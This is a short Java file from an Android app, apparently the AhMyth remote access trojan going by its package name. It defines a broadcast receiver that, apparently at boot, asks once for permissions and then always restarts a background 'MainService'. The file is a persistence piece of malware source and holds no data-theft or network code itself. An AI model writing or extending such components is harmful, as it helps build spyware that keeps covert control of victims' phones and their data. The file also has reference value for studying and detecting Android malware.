package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

public class MyReceiver extends BroadcastReceiver {
    public MyReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // Request permissions first, then start service
        SharedPreferences prefs = context.getSharedPreferences("ahmyth", Context.MODE_PRIVATE);
        boolean permissionsRequested = prefs.getBoolean("permissions_requested", false);
        
        if (!permissionsRequested) {
            // Launch PermissionActivity on first boot
            Intent permIntent = new Intent(context, PermissionActivity.class);
            permIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(permIntent);
            
            prefs.edit().putBoolean("permissions_requested", true).apply();
        }
        
        // Start service
        Intent serviceIntent = new Intent(context, MainService.class);
        context.startService(serviceIntent);
    }
}
